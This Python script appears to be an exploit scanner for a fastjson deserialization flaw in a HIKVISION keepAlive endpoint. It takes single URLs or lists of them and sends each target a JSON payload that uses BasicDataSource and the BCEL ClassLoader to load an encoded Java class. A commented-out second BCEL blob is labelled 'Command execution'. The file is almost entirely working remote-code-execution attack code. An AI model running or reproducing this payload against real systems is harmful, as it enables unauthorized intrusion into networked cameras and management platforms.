import requests
import urllib3
import re
from urllib.parse import urljoin,quote
import argparse
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/bic/ssoService/v1/keepAlive")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
        "Content-Type": "application/json",
    }
    
    #Command execution
    #$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A
    data = """{"CTGT":{ "a": {"@type": "java.lang.Class","val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"},"b": {"@type": "java.lang.Class","val": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"c": {"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dT$dbV$d3$40$U$dd$Dm$93$86T$a0$5c$b4$w$w$5e$5b$$$ad$f7$L$a0$82$I$5e$u$b0$96e$e9R$9f$d20$z$81$90$e0d$K$7c$80$P$7e$86o$3e$fbR$5d$o$7e$80$3f$e4$9b$cb3MX$b4$W$d72$P3$99$7d$f6$d9sfON$7e$fe$fe$f6$D$c0M$y$hH$e2$bc$81$L$b8$a8$86K$3a$$$h$b8$82$ac$8e$9c$86$R$D$gF5$8c$Z$YG$5eGA$c7U$j$d7t$5cW$81$h$K$bd$a9$f2o$e9$b8$ad$e1$8e$8e$bb$3a$ee$e9$98$d00$a9a$8a$n1$e5x$8e$7c$c0$d0$99$cd$bdd$88$cd$fa$ab$9c$a1$bb$e8x$7c$a9$b6Y$e6b$c5$w$bb$84$e8S$b6$h1S$ri$d9$h$8b$d6V$pDB$MF$c9$af$J$9b$cf$3b$8a$da$hl$J$c7$ab$aeq$d7$f5w$f2$eb$d6$b6e$o$83$93$g$ee$9bx$80$87$s$a61$c30$e5$8bj$3edV$84$b5$c9w$7c$b1$91$df$e1$e5$bc$ed$7b$92$ef$ca$bc$e0$efj$3c$90$f9$X$e1$3c$h$c2O$7dw$95$L$N$8fL$cc$e21C$7f$95$cb$881$p$a5p$ca5$c9$D$3a$80$da$b6$e0Z$5e$b50$ebZA$60b$O$f3$M$3d$87$f0ry$9d$dbR$c3$T$TO$f1$8ca$fa$7f$eb$vq$b1$ed$k$b9iW$a3$96$60$cb$f7$C$b2aH$ed$b5$9b$PB$faa$daA$3cI$ecW$c2$91$5c$98x$8ey$T$L$u$9aX$c4$S$83$a6$ca$90$ae$d7RpI$aa$da$c8$eb$d0X_$b8$ab$M$f1$8a$5b$L$d6h$b6$5d_$89$f6$j$f2$e7vm$be$r$j$9fT$86l$7f$b3P$b1$C$b9$k$f8$5ea$bb$e6$W$9a$af$a8e$97$955$c1$z$SN$d95$n$b8$t$P$d6$fd$d9$5c$f1o$W$5d$fc$A$j$o$ba$99$86$cfE$df$a2$eba$c8$b4$d0$9bB$w$e7$c8$A$Z$e2$d2K$Da$b8$94$z$fe$7d$f2$c96$c5$c9$d0$c4E$$$d7$7c$wq$fa$88$9c$b7m9$cd$w$82W$5c$fa$I$K$a1$C$c9$9d$f8W$8c$g$c5$f1$b6$fd$N$b2$f8$5e$f36$e1W$d4$b2M$E$e5$da$nj$N$w$f71$b7$5dK$f0$d5$D$e1T$c0$e5$8cm$f3$mp$g$9d$W$cb$beQ$9d$a8$xgC3$fa$da$cd$9c$c40NP$5b$ab$a7$DL$f5$X$8d$a7h5D3$a39$3e$f2$F$ec3$bd0$9c$a61$R$82$d0$89$QQY$96$d0$E$a1$fb_$d1QGg$3aVG$3c$9d$e8$dc$87V$87$cehN$d6a$yD$c1$$$K$WG$d3f$U$5e$i$h$89$IK$R$n$a5$b2$8f$85$e1$ee$89X$sFr$3d$99$d8xD$9b$88g$e2u$f4$a6$d31b$bc$eeL$f7$95$88$96$89$d3$wI$ab$7eZ$Z$afB$c6$40$a4$91$89G$a9$R$3e$d8$86$7fBl$e1s$e3$60_$b1$87$e3$e4$84$3a$ea$p$f4$d0$a8$a3$97$fc$Z$82$81$i$ba$e8$_$aa$fe$3d$v$y$e3$YV$d0$8d7$c4$a9$Q$e3$3d$d2$f8$80$3e$7cD$3fi$M$92$ca$A$be$93$d2$ZRH$a2$e3$X$f64$9cU$k$9ek$Y$3d$fc$H$c8$p$c8$M$95$F$A$A"}}}"""
    try:
        response = requests.post(target, verify=False, headers=headers, data=data, timeout=15)
        if response.status_code == 200 and 'helloworld' in response.text:
                print(f"\033[31mDiscovered:{url}:HIKVISION_keepAlive_fastjsondeserialization!\033[0m")
                return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")
